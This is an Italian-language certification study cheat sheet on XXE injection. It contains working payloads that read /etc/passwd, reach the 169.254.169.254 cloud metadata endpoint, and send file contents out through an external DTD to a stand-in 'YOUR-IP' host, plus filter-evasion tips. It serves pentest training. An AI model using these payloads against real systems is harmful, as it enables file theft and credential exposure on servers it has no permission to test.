---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "XXE (XML External Entity)"
permalink: "/cheatsheet/ewpt/03-file-inclusion/07-xxe-basics/"
section: "File Inclusion"
section_order: 3
order: 7
sort_key: 307
---

**Difficoltà:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [06-SSRF-Basics.md](/cheatsheet/ewpt/03-file-inclusion/06-ssrf-basics/)
**Lab:** PortSwigger Academy, XML external entity (XXE) injection

---

## Obiettivo

La prima volta che vedi un payload XXE ti sembra magia nera: quattro righe di XML e improvvisamente stai leggendo `/etc/passwd` da un endpoint che accettava "solo" un file XML di configurazione. In realtà il meccanismo è semplice una volta capito: gli standard XML permettono di definire "entità" che il parser espande automaticamente, e se il parser è configurato per risolvere entità esterne, puoi dirgli di andare a leggere un file locale (o fare una richiesta di rete, tornando dritti all'SSRF che hai appena visto) e restituirtelo dentro la risposta. È uno dei pochi bug dove capire *come* funziona il parser è più importante di conoscere venti payload a memoria.

---

## Concetti chiave

### Dove nasce un XXE

Ogni endpoint che accetta e fa il parsing di XML è un candidato: upload di file SVG/DOCX/XLSX (sono XML sotto il cofano), API SOAP, feed RSS/Atom, configurazioni caricate dall'utente, persino alcuni parser di JSON che accettano anche XML come fallback.

### DTD ed entità esterne, in breve

Un documento XML può dichiarare un DOCTYPE con una DTD (Document Type Definition) che definisce entità: normalmente sono scorciatoie testuali, ma un'entità esterna (`SYSTEM`) dice al parser di andare a recuperare il contenuto da un file o un URL e sostituirlo al posto dell'entità nel documento.

### Classi di impatto

| Tipo | Cosa ottieni | Esempio |
|------|--------------|---------|
| XXE classico (in-band) | contenuto del file letto torna nella risposta | leggere `/etc/passwd`, file di configurazione con credenziali |
| XXE blind (out-of-band) | nessun contenuto in risposta, ma il parser fa comunque la richiesta | conferma via Collaborator/interactsh, esfiltrazione a step con DTD esterna malevola |
| XXE -> SSRF | l'entità punta a un URL invece che a un file | stesso impatto dell'SSRF visto nella pagina precedente, ma innescato via XML |
| Billion Laughs (DoS) | entità annidate che si espandono esponenzialmente | consumo di memoria/CPU, fuori scope offensivo in un engagement normale ma utile da riconoscere |

---

## Strumenti

| Tool | Uso | Output | Note |
|------|-----|--------|------|
| Burp Repeater | invio manuale del payload XML modificato | risposta del server | il modo più diretto per iterare rapidamente sul payload |
| Burp Collaborator / interactsh | genera un endpoint che logga richieste in arrivo | conferma XXE blind | stesso ruolo che ha per SSRF |

---

## Payload / Esempi

### Esempio 1: XXE classico per leggere un file locale

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
```

**Spiegazione:** l'entità `xxe` viene dichiarata come esterna (`SYSTEM`) e punta al file locale; se il parser la risolve e il contenuto finisce nel campo `<name>` della risposta, hai appena letto un file arbitrario dal filesystem del server.

### Esempio 2: XXE che innesca una richiesta SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<data>&xxe;</data>
```

**Spiegazione:** stessa struttura, ma l'entità punta a un URL invece che a un file: il parser XML diventa un client HTTP che fai muovere tu, esattamente come nell'SSRF, solo che l'ingresso è un documento XML invece di un parametro URL.

### Esempio 3: XXE blind con DTD esterna (out-of-band)

```xml
<!-- evil.dtd ospitato sul tuo server -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-IP/?x=%file;'>">
%eval;
%exfil;
```

```xml
<!-- payload inviato al target -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-IP/evil.dtd"> %xxe; ]>
<foo>test</foo>
```

**Spiegazione:** quando il parser non ti restituisce nulla in risposta, incateni una DTD esterna che legge il file e lo appende come parametro a una richiesta verso il tuo host: il contenuto del file arriva nei log del tuo server, non nella risposta dell'app.

---

## Evasion / Bypass Techniques

- Se l'endpoint accetta upload di DOCX/XLSX/SVG invece di XML puro, ricorda che sono archivi ZIP contenenti XML: puoi modificare l'XML interno e ricomprimere per innescare lo stesso XXE dentro un formato "insospettabile"
- Alcuni parser bloccano `SYSTEM` ma non `PUBLIC`: vale la pena provare entrambe le sintassi
- Se il parser sembra "patchato" contro XXE classico, prova comunque la variante out-of-band: molte mitigazioni disabilitano solo l'espansione in-band, non le richieste esterne durante il parsing della DTD

---

## Lab Hands-On

### Lab 1: PortSwigger Academy, XXE basic
**Obiettivo:** sfruttare un endpoint che accetta XML per leggere un file arbitrario dal filesystem del server
**Difficulty:** Facile
**Time:** 30 min

**Walkthrough breve:**
1. Trova un endpoint che accetta un body XML (spesso un form che dice "salva le preferenze" o simile)
2. Intercetta la richiesta in Burp e aggiungi un DOCTYPE con entità esterna che punta a un file noto
3. Verifica se il contenuto del file torna nella risposta

---

## Common Mistakes

- Provare XXE solo su endpoint "ovviamente XML" -> upload di SVG/DOCX/XLSX sono XML travestiti, e spesso il team di sviluppo non li tratta con lo stesso sospetto
- Arrendersi se il payload in-band non produce output -> prova sempre la variante blind con Collaborator prima di concludere che non è vulnerabile
- Confondere un XXE bloccato con un endpoint che semplicemente non fa parsing XML per niente -> verifica prima che il parser accetti DOCTYPE, altrimenti stai testando la cosa sbagliata

---

## Link Utili

- [PortSwigger: XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- [HackTricks: XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

---

## Connessioni

- **Prerequisito:** [06-SSRF-Basics.md](/cheatsheet/ewpt/03-file-inclusion/06-ssrf-basics/)
- **Prossimo Step:** [Lab-Challenges.md](/cheatsheet/ewpt/03-file-inclusion/lab-challenges/)
- **Combinazione con:** [01-LFI-Basics.md](/cheatsheet/ewpt/03-file-inclusion/01-lfi-basics/)

---

## Checklist di padronanza

- [ ] Capisco cos'è una DTD e come un'entità SYSTEM diventa un problema
- [ ] So distinguere XXE in-band da XXE blind e testare entrambi
- [ ] So che formati come SVG/DOCX/XLSX sono XML e vanno testati come tali
- [ ] So collegare un XXE a un impatto SSRF quando il target punta a un URL invece che a un file
